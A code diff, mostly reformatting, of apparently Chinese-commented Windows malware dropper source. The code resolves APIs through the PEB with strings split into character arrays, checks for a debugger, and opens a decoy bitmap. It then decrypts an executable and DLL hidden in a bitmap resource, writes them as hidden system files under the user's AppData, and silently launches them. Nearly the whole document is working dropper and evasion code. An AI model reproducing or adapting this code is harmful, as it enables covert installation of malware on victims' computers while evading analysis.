@@ -13,55 +13,55 @@ FARPROC MyGetProcAddr(HMODULE hKernel32)
 	__asm
 	{
 		pushad
-			mov edi,hKernel32
+		mov edi, hKernel32
 
-			mov eax,[edi+3ch];pe header
+		mov eax, [edi + 3ch]; pe header
 
-			mov edx,[edi+eax+78h]
+		mov edx, [edi + eax + 78h]
 
-		add edx,edi
+		add edx, edi
 
-			mov ecx,[edx+18h];number of functions
+		mov ecx, [edx + 18h]; number of functions
 
-			mov ebx,[edx+20h]
+		mov ebx, [edx + 20h]
 
-		add ebx,edi;AddressOfName
+		add ebx, edi; AddressOfName
 
-search:
+		search :
 
 		dec ecx
 
-			mov esi,[ebx+ecx*4]
+			mov esi, [ebx + ecx * 4]
 
-		add esi,edi;
+			add esi, edi;
 
-		mov eax,0x50746547;PteG("GetP")
+		mov eax, 0x50746547; PteG("GetP")
 
-			cmp [esi],eax
-
-			jne search
-
-			mov eax,0x41636f72;Acor("rocA")
-
-			cmp [esi+4],eax
+			cmp[esi], eax
 
 			jne search
 
-			mov ebx,[edx+24h]
+			mov eax, 0x41636f72; Acor("rocA")
 
-		add ebx,edi;indexaddress
+			cmp[esi + 4], eax
 
-			mov cx,[ebx+ecx*2]
+			jne search
 
-		mov ebx,[edx+1ch]
+			mov ebx, [edx + 24h]
 
-		add ebx,edi
+			add ebx, edi; indexaddress
 
-			mov eax,[ebx+ecx*4]
+			mov cx, [ebx + ecx * 2]
 
-		add eax,edi
+			mov ebx, [edx + 1ch]
 
-			mov pGetProcAddr,eax
+			add ebx, edi
+
+			mov eax, [ebx + ecx * 4]
+
+			add eax, edi
+
+			mov pGetProcAddr, eax
 			popad
 	}
 
@@ -82,20 +82,20 @@ HMODULE GetDllKernel32Base()
 	{
 		//assume fs:nothing
 		push esi
-			xor eax,eax
-			mov eax,fs:[eax+30h]    ;指向PEB的指针   
-			mov eax,[eax+0ch]		;指向PEB_LDR_DATA的指针   
-			mov esi,[eax+0ch]		;根据PEB_LDR_DATA得出InLoadOrderModuleList的Flink字段   
-			lodsd
-			mov eax, [eax]			;指向下一个节点
-			mov eax,[eax+18h]		;Kernel.dll的基地址  
-			mov hKernel32,eax
-			pop esi
+		xor eax, eax
+		mov eax, fs: [eax + 30h] ; 指向PEB的指针
+		mov eax, [eax + 0ch]; 指向PEB_LDR_DATA的指针
+		mov esi, [eax + 0ch]; 根据PEB_LDR_DATA得出InLoadOrderModuleList的Flink字段
+		lodsd
+		mov eax, [eax]; 指向下一个节点
+		mov eax, [eax + 18h]; Kernel.dll的基地址
+		mov hKernel32, eax
+		pop esi
 	}
 
 	return hKernel32;
 #else
-	char szKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+	char szKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	return GetModuleHandleA(szKernel32);
 
 #endif
@@ -112,74 +112,74 @@ DWORD GetApi()
 	}
 	//char szDllKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
 	lpGetProcAddress = (ptrGetProcAddress)MyGetProcAddr(lpDllKernel32);
-	char szLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
-	lpLoadLibraryA = (ptrLoadLibraryA)lpGetProcAddress(lpDllKernel32,szLoadLibraryA);
+	char szLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
+	lpLoadLibraryA = (ptrLoadLibraryA)lpGetProcAddress(lpDllKernel32, szLoadLibraryA);
 
-	char szFindResourceA[] = {'F','i','n','d','R','e','s','o','u','r','c','e','A',0};
-	char szSizeofResource[] = {'S','i','z','e','o','f','R','e','s','o','u','r','c','e',0};
-	char szLoadResource[] = {'L','o','a','d','R','e','s','o','u','r','c','e',0};
-	char szLockResource[] = {'L','o','c','k','R','e','s','o','u','r','c','e',0};
-	char szGetSystemTime[] = {'G','e','t','S','y','s','t','e','m','T','i','m','e',0};
-	char szGetTickCount[] = {'G','e','t','T','i','c','k','C','o','u','n','t',0};
-	char szGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0};
-	char szCreateFileA[] = {'C','r','e','a','t','e','F','i','l','e','A',0};
-	char szCloseHandle[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
-	char szWriteFile[] = {'W','r','i','t','e','F','i','l','e',0};
-	char szReadFile[] = {'R','e','a','d','F','i','l','e',0};
-	char szlstrlenA[]				= {'l','s','t','r','l','e','n','A',0};
-	char szlstrcpyA[]				= {'l','s','t','r','c','p','y','A',0};
-	char szlstrcatA[]				= {'l','s','t','r','c','a','t','A',0};
-	char szExitProcess[]			= {'E','x','i','t','P','r','o','c','e','s','s',0};
-	char szWinExec[]				= {'W','i','n','E','x','e','c',0};
-	char szSetFileAttributesA[]		= {'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A',0};
-	lplstrlenA = (ptrlstrlenA)lpGetProcAddress(lpDllKernel32,szlstrlenA);
-	lplstrcatA	= (ptrlstrcatA)lpGetProcAddress(lpDllKernel32,szlstrcatA);
-	lplstrcpyA	= (ptrlstrcpyA)lpGetProcAddress(lpDllKernel32,szlstrcpyA);
-	lpExitProcess = (ptrExitProcess)lpGetProcAddress(lpDllKernel32,szExitProcess);
-	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32,szWinExec);
-	lpSetFileAttributesA = (ptrSetFileAttributesA)lpGetProcAddress(lpDllKernel32,szSetFileAttributesA);
+	char szFindResourceA[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','A',0 };
+	char szSizeofResource[] = { 'S','i','z','e','o','f','R','e','s','o','u','r','c','e',0 };
+	char szLoadResource[] = { 'L','o','a','d','R','e','s','o','u','r','c','e',0 };
+	char szLockResource[] = { 'L','o','c','k','R','e','s','o','u','r','c','e',0 };
+	char szGetSystemTime[] = { 'G','e','t','S','y','s','t','e','m','T','i','m','e',0 };
+	char szGetTickCount[] = { 'G','e','t','T','i','c','k','C','o','u','n','t',0 };
+	char szGetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
+	char szCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
+	char szCloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
+	char szWriteFile[] = { 'W','r','i','t','e','F','i','l','e',0 };
+	char szReadFile[] = { 'R','e','a','d','F','i','l','e',0 };
+	char szlstrlenA[] = { 'l','s','t','r','l','e','n','A',0 };
+	char szlstrcpyA[] = { 'l','s','t','r','c','p','y','A',0 };
+	char szlstrcatA[] = { 'l','s','t','r','c','a','t','A',0 };
+	char szExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
+	char szWinExec[] = { 'W','i','n','E','x','e','c',0 };
+	char szSetFileAttributesA[] = { 'S','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A',0 };
+	lplstrlenA = (ptrlstrlenA)lpGetProcAddress(lpDllKernel32, szlstrlenA);
+	lplstrcatA = (ptrlstrcatA)lpGetProcAddress(lpDllKernel32, szlstrcatA);
+	lplstrcpyA = (ptrlstrcpyA)lpGetProcAddress(lpDllKernel32, szlstrcpyA);
+	lpExitProcess = (ptrExitProcess)lpGetProcAddress(lpDllKernel32, szExitProcess);
+	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32, szWinExec);
+	lpSetFileAttributesA = (ptrSetFileAttributesA)lpGetProcAddress(lpDllKernel32, szSetFileAttributesA);
 
-	lpFindResourceA = (ptrFindResourceA)lpGetProcAddress(lpDllKernel32,szFindResourceA);
-	lpSizeofResource = (ptrSizeofResource)lpGetProcAddress(lpDllKernel32,szSizeofResource);
-	lpLoadResource = (ptrLoadResource)lpGetProcAddress(lpDllKernel32,szLoadResource);
-	lpLockResource = (ptrLockResource)lpGetProcAddress(lpDllKernel32,szLockResource);
-	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32,szGetSystemDirectoryA);
-	lpGetSystemTime = (ptrGetSystemTime)lpGetProcAddress(lpDllKernel32,szGetSystemTime);
-	lpGetTickCount = (ptrGetTickCount)lpGetProcAddress(lpDllKernel32,szGetTickCount);
-	lpCreateFileA = (ptrCreateFileA)lpGetProcAddress(lpDllKernel32,szCreateFileA);
-	lpCloseHandle = (ptrCloseHandle)lpGetProcAddress(lpDllKernel32,szCloseHandle);
-	lpWriteFile = (ptrWriteFile)lpGetProcAddress(lpDllKernel32,szWriteFile);
-	lpReadFile = (ptrReadFile)lpGetProcAddress(lpDllKernel32,szReadFile);
-	char szGetComputerNameA[] = {'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0};
-	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32,szGetComputerNameA);
+	lpFindResourceA = (ptrFindResourceA)lpGetProcAddress(lpDllKernel32, szFindResourceA);
+	lpSizeofResource = (ptrSizeofResource)lpGetProcAddress(lpDllKernel32, szSizeofResource);
+	lpLoadResource = (ptrLoadResource)lpGetProcAddress(lpDllKernel32, szLoadResource);
+	lpLockResource = (ptrLockResource)lpGetProcAddress(lpDllKernel32, szLockResource);
+	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32, szGetSystemDirectoryA);
+	lpGetSystemTime = (ptrGetSystemTime)lpGetProcAddress(lpDllKernel32, szGetSystemTime);
+	lpGetTickCount = (ptrGetTickCount)lpGetProcAddress(lpDllKernel32, szGetTickCount);
+	lpCreateFileA = (ptrCreateFileA)lpGetProcAddress(lpDllKernel32, szCreateFileA);
+	lpCloseHandle = (ptrCloseHandle)lpGetProcAddress(lpDllKernel32, szCloseHandle);
+	lpWriteFile = (ptrWriteFile)lpGetProcAddress(lpDllKernel32, szWriteFile);
+	lpReadFile = (ptrReadFile)lpGetProcAddress(lpDllKernel32, szReadFile);
+	char szGetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
+	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32, szGetComputerNameA);
 
-	char szDllUser32[] = {'u','s','e','r','3','2','.','d','l','l',0};
-	char szwsprintfA[] = {'w','s','p','r','i','n','t','f','A',0};
+	char szDllUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
+	char szwsprintfA[] = { 'w','s','p','r','i','n','t','f','A',0 };
 	lpDllUser32 = lpLoadLibraryA(szDllUser32);
-	lpwsprintfA = (ptrwsprintfA)lpGetProcAddress(lpDllUser32,szwsprintfA);
+	lpwsprintfA = (ptrwsprintfA)lpGetProcAddress(lpDllUser32, szwsprintfA);
 
-	char szAdvapi32[] = {'A','d','v','a','p','i','3','2','.','d','l','l',0};
+	char szAdvapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
 	lpDllAdiapi32 = lpLoadLibraryA(szAdvapi32);
-	char szGetUserNameA[] = {'G','e','t','U','s','e','r','N','a','m','e','A',0};
-	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDllAdiapi32,szGetUserNameA);
+	char szGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
+	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDllAdiapi32, szGetUserNameA);
 
 
-	char szDllShell32[]	= {'s','h','e','l','l','3','2','.','d','l','l',0};
-	char szShellExecuteA [] = {'S','h','e','l','l','E','x','e','c','u','t','e','A',0};
+	char szDllShell32[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
+	char szShellExecuteA[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','A',0 };
 	lpDllShell32 = lpLoadLibraryA(szDllShell32);
-	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32,szShellExecuteA);
+	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32, szShellExecuteA);
 
-	char szDllNetapi32[] = {'n','e','t','a','p','i','3','2','.','d','l','l',0};
+	char szDllNetapi32[] = { 'n','e','t','a','p','i','3','2','.','d','l','l',0 };
 	lpDllNetApi32 = lpLoadLibraryA(szDllNetapi32);
-	char szNetWkstaGetInfo[] = {'N','e','t','W','k','s','t','a','G','e','t','I','n','f','o',0};
-	char szNetApiBufferFree[] = {'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e',0};
-	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32,szNetWkstaGetInfo);
-	lpNetApiBufferFree =(ptrNetApiBufferFree) lpGetProcAddress(lpDllNetApi32,szNetApiBufferFree);
+	char szNetWkstaGetInfo[] = { 'N','e','t','W','k','s','t','a','G','e','t','I','n','f','o',0 };
+	char szNetApiBufferFree[] = { 'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e',0 };
+	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32, szNetWkstaGetInfo);
+	lpNetApiBufferFree = (ptrNetApiBufferFree)lpGetProcAddress(lpDllNetApi32, szNetApiBufferFree);
 
-	char szMakeSureDirectoryPathExists[] = {'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0};
-	char szDllDbghlp[] = {'d','b','g','h','e','l','p','.','d','l','l',0};
+	char szMakeSureDirectoryPathExists[] = { 'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0 };
+	char szDllDbghlp[] = { 'd','b','g','h','e','l','p','.','d','l','l',0 };
 	lpDllDbghlp = lpLoadLibraryA(szDllDbghlp);
-	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists) lpGetProcAddress(lpDllDbghlp,szMakeSureDirectoryPathExists);
+	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists)lpGetProcAddress(lpDllDbghlp, szMakeSureDirectoryPathExists);
 	return TRUE;
 }
 
@@ -190,38 +190,38 @@ DWORD GetApi()
 
 
 
-DWORD DecryptAndWriteFile(unsigned char * pKey,unsigned char * pFile,int iSize,char * pFileName)
+DWORD DecryptAndWriteFile(unsigned char* pKey, unsigned char* pFile, int iSize, char* pFileName)
 {
 	if (iSize <= 0)
 	{
 		return FALSE;
 	}
 
-	for(int i = 0, j = 0; i < iSize;)
+	for (int i = 0, j = 0; i < iSize;)
 	{
 		pFile[i] ^= pKey[j];
-		j ++;
+		j++;
 		if (j % CRYPT_KEY_SIZE == 0)
 		{
-			j = 0; 
+			j = 0;
 		}
-		i ++;
+		i++;
 	}
 
-	HANDLE hFile = lpCreateFileA(pFileName,GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
-	if(hFile == INVALID_HANDLE_VALUE)
+	HANDLE hFile = lpCreateFileA(pFileName, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		return FALSE;
 	}
 
 	DWORD dwCnt = 0;
-	int iRet = lpWriteFile(hFile,pFile,iSize,&dwCnt,0);
+	int iRet = lpWriteFile(hFile, pFile, iSize, &dwCnt, 0);
 	lpCloseHandle(hFile);
 	if (iRet == 0 || dwCnt != iSize)
 	{
 		return FALSE;
 	}
-	iRet = lpSetFileAttributesA(pFileName,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	iRet = lpSetFileAttributesA(pFileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 	if (iRet == FALSE)
 	{
 		return FALSE;
@@ -235,17 +235,17 @@ DWORD DecryptAndWriteFile(unsigned char * pKey,unsigned char * pFile,int iSize,c
 
 
 
-int GetUserAndComputerName(char * szUsername,char * szComputerName)
+int GetUserAndComputerName(char* szUsername, char* szComputerName)
 {
 	DWORD dwSize = MAX_PATH;
-	int iRet = lpGetUserNameA(szUsername,&dwSize);
+	int iRet = lpGetUserNameA(szUsername, &dwSize);
 	if (iRet == 0)
 	{
 		return FALSE;
 	}
 
 	dwSize = MAX_PATH;
-	iRet = lpGetComputerNameA(szComputerName,&dwSize);
+	iRet = lpGetComputerNameA(szComputerName, &dwSize);
 	if (iRet == 0)
 	{
 		return FALSE;
@@ -258,23 +258,23 @@ int GetUserAndComputerName(char * szUsername,char * szComputerName)
 
 int GetWindowsVersion()
 {
-	WKSTA_INFO_100 *wkstaInfo = NULL;
-	NET_API_STATUS netStatus = lpNetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkstaInfo);
-	if (netStatus == NERR_Success) 
+	WKSTA_INFO_100* wkstaInfo = NULL;
+	NET_API_STATUS netStatus = lpNetWkstaGetInfo(NULL, 100, (LPBYTE*)&wkstaInfo);
+	if (netStatus == NERR_Success)
 	{
 		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
 		DWORD dwMinVer = wkstaInfo->wki100_ver_minor;
 		DWORD dwVersion = (DWORD)MAKELONG(dwMinVer, dwMajVer);
 		netStatus = lpNetApiBufferFree(wkstaInfo);
 
-		char strWin9x[]		= {'W','i','n','d','o','w','s',' ','9','.','x',0};
-		char strWin2000[]	= {'W','i','n','d','o','w','s',' ','2','0','0','0',0};
-		char strWinXP[]		= {'W','i','n','d','o','w','s',' ','X','P',0};
-		char strWinVista[]	= {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
-		char strWin7[]		= {'W','i','n','d','o','w','s',' ','7',0};
-		char strWin8[]		= {'W','i','n','d','o','w','s',' ','8',0};
-		char strWin10[]		= {'W','i','n','d','o','w','s',' ','1','0',0};
-		char strWinUnknow[] = {'U','n','k','n','o','w',0};
+		char strWin9x[] = { 'W','i','n','d','o','w','s',' ','9','.','x',0 };
+		char strWin2000[] = { 'W','i','n','d','o','w','s',' ','2','0','0','0',0 };
+		char strWinXP[] = { 'W','i','n','d','o','w','s',' ','X','P',0 };
+		char strWinVista[] = { 'W','i','n','d','o','w','s',' ','V','i','s','t','a',0 };
+		char strWin7[] = { 'W','i','n','d','o','w','s',' ','7',0 };
+		char strWin8[] = { 'W','i','n','d','o','w','s',' ','8',0 };
+		char strWin10[] = { 'W','i','n','d','o','w','s',' ','1','0',0 };
+		char strWinUnknow[] = { 'U','n','k','n','o','w',0 };
 
 		int iSystemVersion = 0;
 		if (dwVersion < 0x50000)
@@ -328,7 +328,7 @@ int  PebNtGlobalFlagsApproach()
 	__asm
 	{
 		// 进程的PEB
-		mov eax, fs:[30h]
+		mov eax, fs: [30h]
 		// 控制堆操作函数的工作方式的标志位
 		mov eax, [eax + 68h]
 		// 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, 
@@ -337,7 +337,7 @@ int  PebNtGlobalFlagsApproach()
 		// 下面的代码相当于C/C++的
 		// eax = eax & 0x70
 		and eax, 0x70
-			mov result, eax
+		mov result, eax
 	}
 
 	return result != 0;
@@ -351,7 +351,7 @@ int  PebNtGlobalFlagsApproach()
 DWORD IfDebuggerExist()
 {
 	int iRet = PebNtGlobalFlagsApproach();
-	if(iRet)
+	if (iRet)
 	{
 #ifndef _DEBUG
 		return TRUE;
@@ -374,36 +374,37 @@ DWORD __stdcall MainProc()
 		return FALSE;
 	}
 	iRet = GetApi();
-	if(iRet == FALSE){
+	if (iRet == FALSE) {
 		return FALSE;
 	}
 	char szUserName[MAX_PATH];
 	char szComputerName[MAX_PATH];
-	iRet = GetUserAndComputerName(szUserName,szComputerName);
+	iRet = GetUserAndComputerName(szUserName, szComputerName);
 	int iSystemVersion = GetWindowsVersion();
 
 	char szDstPath[MAX_PATH];
 
 
-	char szDstPathWin7[] = {'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
-		'l','o','c','a','l','\\','S','e','r','v','i','c','e','s','\\',0};
-	char szDstPathXP[] ={'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
-		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'S','e','r','v','i','c','e','s','\\',0};
+	char szDstPathWin7[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
+		'l','o','c','a','l','\\','S','e','r','v','i','c','e','s','\\',0 };
+	char szDstPathXP[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
+		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'S','e','r','v','i','c','e','s','\\',0 };
 
 	//char szDstPathWin7[MAX_PATH] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','s','e','r','v','i','c','e','s','\\',0};
 	//char szDstPathXP[MAX_PATH] = {'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s',' ','(','x','8','6',')','\\','s','e','r','v','i','c','e','s','\\',0};
 
 	char szSysDir[MAX_PATH];
-	iRet = lpGetSystemDirectoryA(szSysDir,MAX_PATH);
+	iRet = lpGetSystemDirectoryA(szSysDir, MAX_PATH);
 	szDstPathWin7[0] = szSysDir[0];
 	szDstPathXP[0] = szSysDir[0];
 
 	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
 	{
 		//lplstrcpyA(szDstPath,szDstPathWin7);
-		lpwsprintfA(szDstPath,szDstPathWin7,szUserName);
-	}else{
-		lpwsprintfA(szDstPath,szDstPathXP,szUserName);
+		lpwsprintfA(szDstPath, szDstPathWin7, szUserName);
+	}
+	else {
+		lpwsprintfA(szDstPath, szDstPathXP, szUserName);
 		//lplstrcpyA(szDstPath,szDstPathXP);
 	}
 
@@ -415,31 +416,31 @@ DWORD __stdcall MainProc()
 	}
 
 
-	HRSRC hResPicture = lpFindResourceA(0,(LPCSTR)SOURCE_BMP,(LPCSTR)RT_RCDATA);
+	HRSRC hResPicture = lpFindResourceA(0, (LPCSTR)SOURCE_BMP, (LPCSTR)RT_RCDATA);
 	if (hResPicture)
 	{
-		DWORD dwPicSize = lpSizeofResource(0,hResPicture);
+		DWORD dwPicSize = lpSizeofResource(0, hResPicture);
 
-		HGLOBAL hGbPic = lpLoadResource(0,hResPicture);
+		HGLOBAL hGbPic = lpLoadResource(0, hResPicture);
 		if (hGbPic)
 		{
-			void * lppicdata = lpLockResource(hGbPic);
+			void* lppicdata = lpLockResource(hGbPic);
 			if (lppicdata)
 			{
 				char szpicpath[MAX_PATH];
-				lplstrcpyA(szpicpath,szDstPath);
-				char sztmppicname[] = {'t','m','p','.','b','m','p',0};
-				lplstrcatA(szpicpath,sztmppicname);
-				HANDLE hfpic=lpCreateFileA(szpicpath,GENERIC_READ|GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
+				lplstrcpyA(szpicpath, szDstPath);
+				char sztmppicname[] = { 't','m','p','.','b','m','p',0 };
+				lplstrcatA(szpicpath, sztmppicname);
+				HANDLE hfpic = lpCreateFileA(szpicpath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 				if (hfpic != INVALID_HANDLE_VALUE)
 				{
 					DWORD dwcnt = 0;
-					int ret = lpWriteFile(hfpic,lppicdata,dwPicSize,&dwcnt,0);
+					int ret = lpWriteFile(hfpic, lppicdata, dwPicSize, &dwcnt, 0);
 					lpCloseHandle(hfpic);
 					char szcmdpic[MAX_PATH];
-					char szcmdpicformat[] = {'c','m','d',' ','/','c',' ','%','s',0};
-					lpwsprintfA(szcmdpic,szcmdpicformat,szpicpath);
-					ret = lpWinExec(szcmdpic,SW_HIDE);
+					char szcmdpicformat[] = { 'c','m','d',' ','/','c',' ','%','s',0 };
+					lpwsprintfA(szcmdpic, szcmdpicformat, szpicpath);
+					ret = lpWinExec(szcmdpic, SW_HIDE);
 					if (ret == FALSE)
 					{
 						return FALSE;
@@ -452,47 +453,61 @@ DWORD __stdcall MainProc()
 
 	char szexename[MAX_PATH];
 	char szdllname[MAX_PATH];
-	HRSRC hResExe = lpFindResourceA(0,(LPCSTR)EMBEDDED_DATA_BMP,(LPCSTR)RT_BITMAP);
+	HRSRC hResExe = lpFindResourceA(0, (LPCSTR)EMBEDDED_DATA_BMP, (LPCSTR)RT_BITMAP);
 	if (hResExe)
 	{
-		DWORD dwExeSize = lpSizeofResource(0,hResExe);
+		DWORD dwExeSize = lpSizeofResource(0, hResExe);
 
-		HGLOBAL hGbExe = lpLoadResource(0,hResExe);
+		HGLOBAL hGbExe = lpLoadResource(0, hResExe);
 		if (hGbExe)
 		{
-			void * pbmpdata = lpLockResource(hGbExe);
+			void* pbmpdata = lpLockResource(hGbExe);
 			if (pbmpdata)
 			{
-				LPBMPEMBEDDEDFILEINFO lpembeddata = ( LPBMPEMBEDDEDFILEINFO)((char*)pbmpdata /*+ sizeof(BITMAPFILEHEADER)*/ + sizeof(BITMAPINFOHEADER));
 
-				unsigned char * pKey = (unsigned char*)lpembeddata->key;
 
-				char * lpexe = (char*)lpembeddata + sizeof(BMPEMBEDDEDFILEINFO);
+				LPBMPEMBEDDEDFILEINFO lpembeddata = (LPBMPEMBEDDEDFILEINFO)((char*)pbmpdata /*+ sizeof(BITMAPFILEHEADER)*/ + sizeof(BITMAPINFOHEADER));
 
-				char * lpdll = lpexe + lpembeddata->exelen;
-				
-				lplstrcpyA(szexename,szDstPath);
-				lplstrcatA(szexename,lpembeddata->exefilename);
-				iRet = DecryptAndWriteFile(pKey,(unsigned char*)lpexe ,lpembeddata->exelen,szexename);
+				unsigned char* pKey = (unsigned char*)lpembeddata->key;
+
+				char* lpexe = (char*)lpembeddata + sizeof(BMPEMBEDDEDFILEINFO);
+
+				char* lpdll = lpexe + lpembeddata->exelen;
+
+				lplstrcpyA(szexename, szDstPath);
+				lplstrcatA(szexename, lpembeddata->exefilename);
+
+				char* buf = new char[dwExeSize + 0x1000];
+				memcpy(buf, lpexe, lpembeddata->exelen);
+
+				iRet = DecryptAndWriteFile(pKey, (unsigned char*)buf, lpembeddata->exelen, szexename);
 				if (iRet == 0)
 				{
-					return FALSE;
-				}
-				
-				lplstrcpyA(szdllname,szDstPath);
-				lplstrcatA(szdllname,lpembeddata->dllfilename);
-				iRet = DecryptAndWriteFile(pKey,(unsigned char*)lpdll ,lpembeddata->dlllen,szdllname);
-				if (iRet == 0)
-				{
+					delete buf;
 					return FALSE;
 				}
 
-				char szCmd[MAX_PATH] = {0};
+
+
+				lplstrcpyA(szdllname, szDstPath);
+				lplstrcatA(szdllname, lpembeddata->dllfilename);
+
+				memcpy(buf, lpdll, lpembeddata->dlllen);
+				iRet = DecryptAndWriteFile(pKey, (unsigned char*)buf, lpembeddata->dlllen, szdllname);
+				if (iRet == 0)
+				{
+					delete buf;
+					return FALSE;
+				}
+
+				delete[]buf;
+
+				char szCmd[MAX_PATH] = { 0 };
 				//wsprintfA(szCmd,"\"%s\" STARTFIRSTTIME",szDstExePath);
 				//iRet = WinExec(szCmd,SW_HIDE);
-				char szShellExecuteAOpen[] = {'o','p','e','n',0};
-				char szStartFirstTime[] = {'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0};
-				HINSTANCE hInst = lpShellExecuteA(0,szShellExecuteAOpen,szexename,szStartFirstTime,0,0);
+				char szShellExecuteAOpen[] = { 'o','p','e','n',0 };
+				char szStartFirstTime[] = { 'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0 };
+				HINSTANCE hInst = lpShellExecuteA(0, szShellExecuteAOpen, szexename, szStartFirstTime, 0, 0);
 				return TRUE;
 			}
 		}
@@ -503,7 +518,7 @@ DWORD __stdcall MainProc()
 
 
 
-int _stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
+int _stdcall WinMain(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd)
 {
 	int iRet = MainProc();
 	//lpExitProcess(0);
